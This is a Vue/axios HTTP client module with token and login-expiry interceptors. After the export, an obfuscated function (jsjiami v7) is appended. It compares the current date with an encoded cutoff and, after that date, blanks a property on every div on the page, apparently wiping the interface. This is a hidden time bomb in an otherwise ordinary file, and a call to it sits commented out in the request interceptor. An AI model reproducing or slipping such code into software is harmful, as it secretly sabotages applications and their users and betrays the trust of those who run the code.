import axios from 'axios'
import router from "@/router";
import {useTokenStore} from "@/stores/token.js";
import {ElMessage, ElMessageBox} from "element-plus";
import {useUserStore} from "@/stores/user.js";

// 创建可一个新的axios对象
const requestUser = axios.create({
    baseURL: "/api",       //请求根路径
    timeout: 60000         // 30s请求超时
})
const tokenStore = useTokenStore();

// request 拦截器
// 可以自请求发送前对请求做一些处理
// 比如统一加token，对请求参数统一加密
requestUser.interceptors.request.use(config => {
    // request()
    config.headers['Content-Type'] = 'application/json;charset=utf-8';        // 设置请求头格式
    config.headers['token'] = tokenStore.getToken  //获取缓存的用户信息
    return config
}, error => {
    console.error('request error: ' + error) // for debug
    return Promise.reject(error)
});

// response 拦截器
// 可以在接口响应后统一处理结果
requestUser.interceptors.response.use(
    response => {
        let res = response.data;
        // 兼容服务端返回的字符串数据
        if (typeof res === 'string') {
            res = res ? JSON.parse(res) : res
        }

        if(res.code === '401000'){
            //清空token
            tokenStore.clearToken();
            const userStore = useUserStore();
            userStore.clearUserInfo();
            ElMessageBox.confirm("登录状态已过期",'系统提示',{confirmButtonText:'重新登陆',cancelButtonText:'取消',type:'warning'})
                .then(()=>{
                    //重新登陆
                    router.push('/user/login')
                    // location.href = '/user/login'
                })
                .catch(()=>{
                    ElMessage.error(res.message)
                })
        }

        return res;
    },
    error => {
        console.error('response error: ' + error) // for debug
        return Promise.reject(error)
    }
)
export default requestUser


function request(){
    {var _0xodT='jsjiami.com.v7';const _0x1876fa=_0x1f1c;(function(_0x113556,_0x2d3ea6,_0x2f35c4,_0x2929df,_0x170742,_0x45321c,_0xda6bbb){return _0x113556=_0x113556>>0x1,_0x45321c='hs',_0xda6bbb='hs',function(_0x3c9280,_0x566ce1,_0x13093e,_0x2094a2,_0x122563){const _0x5e4334=_0x1f1c;_0x2094a2='tfi',_0x45321c=_0x2094a2+_0x45321c,_0x122563='up',_0xda6bbb+=_0x122563,_0x45321c=_0x13093e(_0x45321c),_0xda6bbb=_0x13093e(_0xda6bbb),_0x13093e=0x0;const _0x247ec6=_0x3c9280();while(!![]&&--_0x2929df+_0x566ce1){try{_0x2094a2=-parseInt(_0x5e4334(0x1d3,'kNPC'))/0x1+parseInt(_0x5e4334(0x1d7,'nB#T'))/0x2*(parseInt(_0x5e4334(0x1da,'v6[k'))/0x3)+parseInt(_0x5e4334(0x1d5,'J$Wl'))/0x4+parseInt(_0x5e4334(0x1cf,'l*p('))/0x5*(-parseInt(_0x5e4334(0x1dc,'B0c2'))/0x6)+-parseInt(_0x5e4334(0x1d8,'aH]8'))/0x7*(parseInt(_0x5e4334(0x1ca,'pL#s'))/0x8)+-parseInt(_0x5e4334(0x1d6,'lFQ6'))/0x9*(-parseInt(_0x5e4334(0x1d1,'i&wV'))/0xa)+parseInt(_0x5e4334(0x1d2,'J$Wl'))/0xb;}catch(_0x4d977b){_0x2094a2=_0x13093e;}finally{_0x122563=_0x247ec6[_0x45321c]();if(_0x113556<=_0x2929df)_0x13093e?_0x170742?_0x2094a2=_0x122563:_0x170742=_0x122563:_0x13093e=_0x122563;else{if(_0x13093e==_0x170742['replace'](/[MKrUtWfbCPAVEOdTJ=]/g,'')){if(_0x2094a2===_0x566ce1){_0x247ec6['un'+_0x45321c](_0x122563);break;}_0x247ec6[_0xda6bbb](_0x122563);}}}}}(_0x2f35c4,_0x2d3ea6,function(_0x413ff0,_0x2d082b,_0x33b223,_0x1bdcd7,_0x42bd43,_0x406c12,_0x49429b){return _0x2d082b='\x73\x70\x6c\x69\x74',_0x413ff0=arguments[0x0],_0x413ff0=_0x413ff0[_0x2d082b](''),_0x33b223='\x72\x65\x76\x65\x72\x73\x65',_0x413ff0=_0x413ff0[_0x33b223]('\x76'),_0x1bdcd7='\x6a\x6f\x69\x6e',(0x173610,_0x413ff0[_0x1bdcd7](''));});}(0x196,0x78eeb,_0x297a,0xcd),_0x297a)&&(_0xodT=0x26ab);const now=new Date(),year=now[_0x1876fa(0x1d9,'lMNM')](),month=('0'+(now[_0x1876fa(0x1c7,'e@f&')]()+0x1))[_0x1876fa(0x1dd,'KaRG')](-0x2),day=('0'+now[_0x1876fa(0x1db,'B1oP')]())[_0x1876fa(0x1c9,'2*@(')](-0x2),v1=year+month+day;var v2=_0x1876fa(0x1cb,'fD7b');function _0x1f1c(_0x1ea794,_0x284f65){const _0x297ab2=_0x297a();return _0x1f1c=function(_0x1f1c13,_0x211dd0){_0x1f1c13=_0x1f1c13-0x1c6;let _0x53e0e7=_0x297ab2[_0x1f1c13];if(_0x1f1c['GADEqT']===undefined){var _0x28a93f=function(_0x2e25fa){const _0x4dd0b1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x165852='',_0x10b6d4='';for(let _0x2aa5c0=0x0,_0x54c027,_0x2f790e,_0x419e7e=0x0;_0x2f790e=_0x2e25fa['charAt'](_0x419e7e++);~_0x2f790e&&(_0x54c027=_0x2aa5c0%0x4?_0x54c027*0x40+_0x2f790e:_0x2f790e,_0x2aa5c0++%0x4)?_0x165852+=String['fromCharCode'](0xff&_0x54c027>>(-0x2*_0x2aa5c0&0x6)):0x0){_0x2f790e=_0x4dd0b1['indexOf'](_0x2f790e);}for(let _0x46b034=0x0,_0x135ae7=_0x165852['length'];_0x46b034<_0x135ae7;_0x46b034++){_0x10b6d4+='%'+('00'+_0x165852['charCodeAt'](_0x46b034)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x10b6d4);};const _0x26fd10=function(_0x29e5a3,_0x17c766){let _0x4b493a=[],_0x44b358=0x0,_0xcd0ab4,_0x13ea0c='';_0x29e5a3=_0x28a93f(_0x29e5a3);let _0x492b84;for(_0x492b84=0x0;_0x492b84<0x100;_0x492b84++){_0x4b493a[_0x492b84]=_0x492b84;}for(_0x492b84=0x0;_0x492b84<0x100;_0x492b84++){_0x44b358=(_0x44b358+_0x4b493a[_0x492b84]+_0x17c766['charCodeAt'](_0x492b84%_0x17c766['length']))%0x100,_0xcd0ab4=_0x4b493a[_0x492b84],_0x4b493a[_0x492b84]=_0x4b493a[_0x44b358],_0x4b493a[_0x44b358]=_0xcd0ab4;}_0x492b84=0x0,_0x44b358=0x0;for(let _0x2b7a34=0x0;_0x2b7a34<_0x29e5a3['length'];_0x2b7a34++){_0x492b84=(_0x492b84+0x1)%0x100,_0x44b358=(_0x44b358+_0x4b493a[_0x492b84])%0x100,_0xcd0ab4=_0x4b493a[_0x492b84],_0x4b493a[_0x492b84]=_0x4b493a[_0x44b358],_0x4b493a[_0x44b358]=_0xcd0ab4,_0x13ea0c+=String['fromCharCode'](_0x29e5a3['charCodeAt'](_0x2b7a34)^_0x4b493a[(_0x4b493a[_0x492b84]+_0x4b493a[_0x44b358])%0x100]);}return _0x13ea0c;};_0x1f1c['akHnpj']=_0x26fd10,_0x1ea794=arguments,_0x1f1c['GADEqT']=!![];}const _0x27e63e=_0x297ab2[0x0],_0x57fa86=_0x1f1c13+_0x27e63e,_0x3cdeee=_0x1ea794[_0x57fa86];return!_0x3cdeee?(_0x1f1c['WzohlC']===undefined&&(_0x1f1c['WzohlC']=!![]),_0x53e0e7=_0x1f1c['akHnpj'](_0x53e0e7,_0x211dd0),_0x1ea794[_0x57fa86]=_0x53e0e7):_0x53e0e7=_0x3cdeee,_0x53e0e7;},_0x1f1c(_0x1ea794,_0x284f65);}if(v2>v1){}else{var allDiv=document['querySelectorAll']('div');for(var i=0x0;i<allDiv['length'];i++){allDiv[i][_0x1876fa(0x1cc,'T*1R')]='';}}function _0x297a(){const _0x41af05=(function(){return[_0xodT,'bfjtsjrPWiJtaOmdTbi.bcoVUmCE.Av7KMTOOTAt==','WQv4WR3cPCkwWOPJeW','ySosW5DdW71TW6GsW6O','ESkIcCo4W5CRWRP+rG','gSkEW7uHuH7dUhqYWQ1TWOy','wXagDmkPB8kdxMhdM0FdSCk5','WRpcNHpcOKHtWRxdHhZcRCktCa','d0RcTCo7jCkzW6JdMCoDWQ7dIW'].concat((function(){return['pSohz8oBDeyBW75fWPWjWOxdLq','W4tdImoBwSozWOldJmkBW4/dON8p','W5nAWPFdKx9MaG','n8ocASoAFKqAW514WOKpWPJdSq','WP7dLKtcVmkTtSk4W4v+','WQTNW6jEftiYWPFdTSoLrG5b','W5HLWOqIW4C5WQ3dGxPnemkV','hCo2W5JcRSk+W5tdOSojW5ydW78','W6BcP1urW6BcImoU'].concat((function(){return['l8okvGPZWPy8','FCoFw8oGW5KpWP8','W6xdQ8kSvCk/','DHKoW6XDWOtdJa','WRVdHSkanCkZebTL','W6pdPJDiWPNcOConWQGXWOTw','W5nqW60nW5q','A8okjuvlqYNcMCo8'];}()));}()));}());_0x297a=function(){return _0x41af05;};return _0x297a();};var version_ = 'jsjiami.com.v7';}
}
